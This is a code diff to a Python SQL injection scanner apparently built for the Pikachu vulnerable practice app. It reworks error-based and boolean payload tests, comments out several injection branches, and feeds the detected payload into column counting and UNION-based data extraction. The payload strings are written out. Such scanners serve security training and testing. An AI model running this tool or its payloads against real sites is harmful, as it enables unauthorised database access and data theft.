@@ -74,12 +74,12 @@ class PikachuSQLiScanner(SQLInjectionScanner):
         # 基于URL路径判断注入类型
         if 'sqli_id.php' in path:
             return '数字型注入', 'POST', self.test_numeric_injection
-        elif 'sqli_str.php' in path:
-            return '字符型注入', 'GET', self.test_string_injection
-        elif 'sqli_search.php' in path:
-            return '搜索型注入', 'GET', self.test_search_injection
-        elif 'sqli_x.php' in path:
-            return 'XX型注入', 'GET', self.test_xx_injection
+        # elif 'sqli_str.php' in path:
+        #     return '字符型注入', 'GET', self.test_string_injection
+        # elif 'sqli_search.php' in path:
+        #     return '搜索型注入', 'GET', self.test_search_injection
+        # elif 'sqli_x.php' in path:
+        #     return 'XX型注入', 'GET', self.test_xx_injection
         else:
             # 默认使用xx型注入
             return 'XX型注入', 'GET', self.test_xx_injection
@@ -95,7 +95,7 @@ class PikachuSQLiScanner(SQLInjectionScanner):
         # 首先测试正常请求
         normal_response = self.send_request(url, method='POST', data={'id': '1', 'submit': '查询'})
         if not normal_response:
-            return False, None, None, None
+            return False, None, None, None, None
             
         # 测试基于错误的注入 - 尝试不同的闭合方式
         test_payloads = ["1'", '1"', "1')", '1\")', "1`"]
@@ -105,19 +105,19 @@ class PikachuSQLiScanner(SQLInjectionScanner):
             is_vul, db_type = self.is_vulnerable(response)
             if is_vul:
                 self.print(f"[!] 数字型注入 - 发现基于错误的SQL注入漏洞！使用Payload: {payload}")
-                return True, 'POST', 'id', {'submit': '查询'}
+                return True, 'POST', 'id', {'submit': '查询'}, payload
         
         # 测试基于布尔的盲注
-        true_payloads = ["1 AND 1=1", "1 AND 1=1 # ", "1 AND 1=1 #"]
-        false_payloads = ["1 AND 1=2", "1 AND 1=2 # ", "1 AND 1=2 #"]
+        # true_payloads = ["1 AND 1=1", "1 AND 1=1 # ", "1 AND 1=1 #"]
+        # false_payloads = ["1 AND 1=2", "1 AND 1=2 # ", "1 AND 1=2 #"]
         
-        for i in range(len(true_payloads)):
-            if self.check_boolean_based(url, true_payloads[i], false_payloads[i], 'POST', 'id', {'submit': '查询'}):
-                self.print(f"[!] 数字型注入 - 发现基于布尔的SQL注入漏洞！")
-                return True, 'POST', 'id', {'submit': '查询'}
+        # for i in range(len(true_payloads)):
+        #     if self.check_boolean_based(url, true_payloads[i], false_payloads[i], 'POST', 'id', {'submit': '查询'}):
+        #         self.print(f"[!] 数字型注入 - 发现基于布尔的SQL注入漏洞！")
+        #         return True, 'POST', 'id', {'submit': '查询'}
             
         self.print("[-] 数字型注入 - 未发现明显的SQL注入漏洞")
-        return False, None, None, None
+        return False, None, None, None, None
 
     def test_string_injection(self):
         """测试字符型注入 (sqli_str.php)"""
@@ -174,32 +174,29 @@ class PikachuSQLiScanner(SQLInjectionScanner):
     def test_xx_injection(self):
         """测试XX型注入 (sqli_x.php)"""
         self.print("\n[*] 开始测试XX型注入...")
-        if self.target_url and 'sqli_x.php' in self.target_url:
-            url = self.target_url
-        else:
-            url = f"{self.base_url}/vul/sqli/sqli_x.php"
+        url = self.target_url
         
         # 测试不同的闭合方式
-        test_payloads = ["1')", '1\")', "1`)", "1') # ", "1') #"]
+        test_payloads = ["1'","1')", '1\")', "1`)", "1') # ", "1') #"]
         
         for payload in test_payloads:
             response = self.send_request(url, params={'name': payload, 'submit': '查询'})
             is_vul, db_type = self.is_vulnerable(response)
             if is_vul:
                 self.print(f"[!] XX型注入 - 发现基于错误的SQL注入漏洞！使用Payload: {payload}")
-                return True, 'GET', 'name', None
+                return True, 'GET', 'name', None, payload
         
         # 测试基于布尔的盲注
-        true_payloads = ["1') AND ('1'='1", "1') AND 1=1 # "]
-        false_payloads = ["1') AND ('1'='2", "1') AND 1=2 # "]
+        # true_payloads = ["1') AND ('1'='1", "1') AND 1=1 # "]
+        # false_payloads = ["1') AND ('1'='2", "1') AND 1=2 # "]
         
-        for i in range(len(true_payloads)):
-            if self.check_boolean_based(url, true_payloads[i], false_payloads[i], 'GET', 'id'):
-                self.print(f"[!] XX型注入 - 发现基于布尔的SQL注入漏洞！")
-                return True, 'GET', 'id', None
+        # for i in range(len(true_payloads)):
+        #     if self.check_boolean_based(url, true_payloads[i], false_payloads[i], 'GET', 'id'):
+        #         self.print(f"[!] XX型注入 - 发现基于布尔的SQL注入漏洞！")
+        #         return True, 'GET', 'id', None, None
             
         self.print("[-] XX型注入 - 未发现明显的SQL注入漏洞")
-        return False, None, None, None
+        return False, None, None, None, None  
 
     def run_complete_scan(self):
         """运行完整的Pikachu SQL注入扫描"""
@@ -243,7 +240,7 @@ class PikachuSQLiScanner(SQLInjectionScanner):
             # 更新进度：测试特定类型的注入
             self.update_progress(min(100, 10 + i * 20), f"测试{name}")
             
-            result, method, param, data_template = test_func()
+            result, method, param, data_template, payload = test_func()
             current_step += 1
             
             if result:
@@ -252,28 +249,28 @@ class PikachuSQLiScanner(SQLInjectionScanner):
                 self.update_progress(min(100, 10 + i * 20 + 5), f"{name}发现漏洞，提取信息")
                 
                 # 确定闭合模式
-                if name == "数字型注入":
-                    closing_pattern = "numeric"
-                elif name == "字符型注入":
-                    closing_pattern = "string"
-                elif name == "搜索型注入":
-                    closing_pattern = "search"
-                elif name == "XX型注入":
-                    closing_pattern = "xx"
+                # if name == "数字型注入":
+                #     closing_pattern = "numeric"
+                # elif name == "字符型注入":
+                #     closing_pattern = "string"
+                # elif name == "搜索型注入":
+                #     closing_pattern = "search"
+                # elif name == "XX型注入":
+                #     closing_pattern = "xx"
                 
                 # 使用用户提供的URL或自动判断的URL
                 url = target_url
                 
                 # 判断字段数（detect_column_count内部会更新进度）
                 self.update_progress(min(100, 10 + i * 20 + 10), f"{name}检测字段数")
-                column_count = self.detect_column_count(url, method, param, data_template, closing_pattern)
+                column_count = self.detect_column_count(url, method, param, data_template, payload)
                 current_step += 1
                 
                 if column_count:
                     # 更新进度：准备提取数据
                     self.update_progress(min(100, 10 + i * 20 + 15), f"{name}提取数据")
                     # 尝试使用UNION查询提取数据
-                    self.extract_with_union(url, method, param, data_template, closing_pattern, column_count)
+                    self.extract_with_union(url, method, param, data_template, payload, column_count)
                     current_step += 1
         
         # 扫描完成，更新进度到100%
